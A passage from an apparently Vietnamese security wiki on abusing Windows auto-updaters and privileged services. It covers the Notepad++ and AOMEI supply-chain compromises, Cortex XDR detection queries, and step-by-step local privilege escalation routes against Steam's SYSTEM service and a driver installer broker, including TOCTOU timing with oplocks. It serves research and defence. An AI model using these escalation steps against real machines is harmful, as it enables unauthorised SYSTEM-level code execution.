1. **Chặn lưu lượng tại hạ tầng**: xâm nhập CDN/hosting và phản hồi các yêu cầu kiểm tra cập nhật bằng metadata do kẻ tấn công kiểm soát, trỏ đến URL tải xuống độc hại.
2. **NSIS bị cài trojan**: installer tải và thực thi payload, đồng thời lợi dụng hai chuỗi thực thi:
   - **Dùng binary đã ký của mình + sideload**: đóng gói `BluetoothService.exe` đã được Bitdefender ký và thả `log.dll` độc hại vào đường dẫn tìm kiếm của nó. Khi binary đã ký chạy, Windows sideload `log.dll`, DLL này giải mã và nạp backdoor Chrysalis theo kiểu reflective (được Warbird bảo vệ + API hashing để cản trở phát hiện tĩnh).
   - **Tiêm shellcode bằng script**: NSIS thực thi một script Lua đã biên dịch, sử dụng Win32 API (ví dụ: `EnumWindowStationsW`) để tiêm shellcode và triển khai Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Bài học về hardening/phát hiện áp dụng cho mọi auto-updater:
- Bắt buộc **xác minh chứng chỉ + chữ ký** của installer đã tải xuống (pin signer của nhà cung cấp, từ chối CN/chuỗi chứng chỉ không khớp) và ký chính manifest cập nhật (ví dụ: XMLDSig). Chặn chuyển hướng do manifest kiểm soát trừ khi đã được xác thực.
- Xem **BYO signed binary sideloading** là một điểm pivot để phát hiện sau khi tải xuống: cảnh báo khi EXE đã ký của nhà cung cấp nạp DLL từ bên ngoài đường dẫn cài đặt chuẩn của nó (ví dụ: Bitdefender nạp `log.dll` từ Temp/Downloads), cũng như khi updater thả/thực thi installer từ thư mục tạm mà không có chữ ký của nhà cung cấp.
- Theo dõi **artifact đặc thù của malware** được quan sát trong chuỗi này (hữu ích làm pivot tổng quát): mutex `Global\Jdhfv_1.0.1`, các thao tác ghi bất thường của `gup.exe` vào `%TEMP%` và các giai đoạn tiêm shellcode do Lua điều khiển.
- Notepad++ đã phản hồi bằng cách tăng cường WinGUp trong v8.8.9 trở lên: XML trả về hiện được ký (XMLDSig), và các bản build mới hơn bắt buộc xác minh chứng chỉ + chữ ký của installer đã tải xuống thay vì chỉ tin vào kênh truyền tải.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading <code>log.dll</code> bởi EXE đã ký của Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> khởi chạy trình cài đặt không phải của Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Các pattern này áp dụng rộng rãi cho mọi updater chấp nhận manifest không chữ ký hoặc không cố định signer của installer—chiếm quyền network + installer độc hại + sideload bằng chữ ký do kẻ tấn công tự tạo có thể dẫn đến thực thi mã dưới vỏ bọc các bản cập nhật “đáng tin cậy”.

### Cấu hình thông báo như một trigger cập nhật thứ hai

Updater có thể dùng các cấu hình từ xa riêng để **đưa nội dung lên hệ thống và kích hoạt thực thi nội dung đó**. Điều này đòi hỏi phải kiểm soát được các cấu hình hoặc phản hồi của chúng; các báo cáo không xác định cách thức giành quyền truy cập vào nguồn. Trong vụ AOMEI, `down_html.ini` chọn URL của archive, phiên bản (`thrid`) và MD5 (`Val`); kẻ tấn công tăng phiên bản, đồng thời thay đổi URL và checksum tương ứng. Đây là [lỗi ranh giới tin cậy của metadata](#2-hijacking-the-update-channel-to-run-code-as-system) đã đề cập ở trên. Đường thực thi bổ sung là `Notifycfg.ini`: tệp này hướng dẫn `ABNotify.exe` tải `upgrade-now.html` đã giải nén thông qua URL `file:///` cục bộ trong WebView. Trang này tự động điều hướng đến một executable nằm cùng thư mục, rồi WebView chuyển executable đó cho system shell. Tiến trình con kế thừa quyền của notifier; điều này không tự động nâng quyền lên SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google cũng báo cáo về một `Notifycfg.ini` bị sửa đổi, có hơn 35.000 section giả lặp lại để vượt qua cơ chế kiểm tra phiên bản thông thường của client này. Báo cáo không chứng minh có một cách bypass parser tổng quát. Kẻ tấn công khôi phục các tệp từ xa sau các khoảng thời gian từ năm đến mười phút, vì vậy chỉ những client polling trong các khoảng thời gian đó mới nhận được cấu hình đã thay đổi. Kênh thông báo này cũng mang một [mồi nhử WebDAV/NTLM](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion) riêng, không cần thực thi archive.<sup>[[18]](#references)</sup>

---
## Bootstrap shared-memory vào IPC của service đặc quyền

Đừng chỉ dừng lại ở việc liệt kê named pipe. Một broker chạy với quyền SYSTEM có thể cung cấp một **file mapping** có quyền truy cập thoáng cho bước thiết lập kết nối, sau đó duplicate handle của anonymous pipe vào tiến trình yêu cầu. Trong thiết kế Steam được kiểm thử, `Global\SteamClientService_SharedMemFile` và `Global\SteamClientService_SharedMemLock` phối hợp bước bắt tay PID/event của client; service trả về hai pipe handle, còn các request tiếp theo có tiền tố độ dài sử dụng `RunInterface` (`0x01`). DACL của mapping cho phép client ở mọi integrity level truy cập. Đối tượng nội bộ `CSteamServiceWin32` trong `steamclient64.dll` cung cấp một client thực tế: xác định global theo build, gọi vtable slot 0 `Connect`, rồi sử dụng các interface map thay vì tự triển khai lại bước bắt tay. Tiếp cận được IPC chỉ là điều kiện tiên quyết; quyết định tin cậy của privileged handler mới xác định có xảy ra escalation hay không. <sup>[[19]](#references)[[20]](#references)</sup>

### Manifest có chữ ký mở rộng thành allowlist executable cũ

`IClientInstallUtils::AddInstallScriptToWhiteList` (slot 21) xác minh `kvsignatures` của VDF có chữ ký, nhưng ghi lại **đường dẫn executable đã được mở rộng**, chứ không phải danh tính tệp bất biến. Với một entry `Run Process` có chữ ký, chẳng hạn `%INSTALLDIR%\Binaries\Prerequisites\vcredist_x86_vs2008sp1.exe`, hãy cung cấp `%INSTALLDIR%` có thể ghi bởi user. Đặt executable thay thế tại đúng đường dẫn sau khi mở rộng, rồi gọi `RunInstallScript` (slot 22) với một VDF không chữ ký có `Process 1` chỉ định đường dẫn nằm trong allowlist. Entry này vẫn tồn tại sau khi script có chữ ký thực thi cho đến khi service khởi động lại; trong implementation được báo cáo, service không xác minh lại tệp trước khi khởi chạy với quyền SYSTEM. Hãy dùng đúng tên tệp đã được ký, không chỉ chọn một tệp thuộc cùng nhóm prerequisite. <sup>[[19]](#references)[[20]](#references)</sup>

### Tiến trình con của module manager bypass kiểm tra chữ ký khi load trực tiếp

`IClientModuleManager::LoadModule` (slot 0) chấp nhận byte của module nếu ID được cung cấp khớp với CRC32 của chúng. `CallFunctionAsync` (slot 3) với `flags & 8` chọn nhánh **child-process**, thay vì nhánh reflective-load trực tiếp có xác minh chữ ký Valve. Service ghi `legacycompat\servicecall_<CRC>.dll` rồi khởi chạy `legacycompat\steamservice.exe /runfunc ...` từ thư mục cài đặt. Nếu thư mục đó có thể ghi bởi user, hãy đặt một executable tại đường dẫn sau, load một module dùng một lần bất kỳ có CRC khớp, rồi gọi phương thức async với bit 3 được bật. Trong build được báo cáo, executable con và DLL được ghi xuống đĩa đều không được xác thực. Bản thân module không cần là payload hoạt động được: executable con bị thay thế mới là thứ chạy với quyền SYSTEM. <sup>[[19]](#references)[[20]](#references)</sup>

### Kiểm tra catalog-member trước khi cài driver với quyền đặc quyền

Với một broker cài driver, hãy kiểm tra xem bước xác thực catalog có ràng buộc với **chính xác INF được chuyển cho installer** hay không. Trong đường thực thi `InstallVrLinkDongleDriver` được báo cáo, `WinVerifyTrust` xác thực catalog và `CryptCATAdminCalcHashFromFileHandle` tìm *ít nhất một* tệp khớp trong thư mục do caller cung cấp, nhưng service sau đó chạy `pnputil /add-driver ... /install` trên `netrtwlanuval.inf` mà không xác định INF này có phải là thành viên catalog dự kiến hay không. Có thể sử dụng một thư mục phẳng hoặc thư mục dành riêng cho kiến trúc. Do đó, catalog có chữ ký chứa bất kỳ tệp nào trong thư mục đó cũng có thể vượt qua bước kiểm tra yếu của service, ngay cả khi INF được chuyển cho installer đặc quyền là một tệp khác. Đừng cho rằng chỉ riêng điều này có thể vô hiệu hóa chính sách ký driver của Windows: cài đặt thành công vẫn phụ thuộc vào package thay thế và chính sách của host. <sup>[[19]](#references)[[20]](#references)</sup>

Service đóng các handle xác thực trước khi `pnputil` mở INF, tạo ra một [khoảng trống TOCTOU](#1-toctou-inside-updater-copyexecute-paths-msi-center-cmd_autoupdatesdk) với điểm đích là cài driver thay vì cập nhật executable. Có thể dùng oplock để canh thời điểm thay thế giữa bước kiểm tra và lúc installer mở tệp. Cùng IPC này cũng cho phép [chuyển tiếp input trên secure desktop](../authentication-credentials-uac-and-efs/uac-user-account-control.md#secure-desktop-input-forwarded-through-a-writable-shared-memory-ring) khi đáp ứng các điều kiện đồng ý riêng. <sup>[[19]](#references)</sup>

## References
- [1] [Tư vấn bảo mật – Netskope Client cho Windows – Leo thang đặc quyền cục bộ qua máy chủ giả mạo (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Tư vấn bảo mật Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC của Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Khai thác ASUS DriverHub, MSI Center, Acer Control Centre và Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Leo thang đặc quyền cục bộ qua các tệp có thể ghi trong Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Leo thang đặc quyền trong Windows agent](https://checkmk.com/werk/16361)
- [10] [PoC của sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer của CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Tác nhân cấp quốc gia khai thác chuỗi cung ứng Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – cập nhật sự cố cơ sở hạ tầng bị chiếm quyền](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Bypass bản sửa lỗi CVE-2025-0309 trong Netskope Client cho Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Phát hiện lỗi leo thang đặc quyền trong Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: Từ gRPC đến SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [Phòng Phân tích Mối đe dọa ManageEngine – Xâm phạm chuỗi cung ứng AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group và Mandiant – Điều tra hành vi can thiệp chuỗi cung ứng trong thời gian ngắn](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
- [19] [Atredis – Khai thác Valve](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [20] [PoC Atredis – Khai thác Valve](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
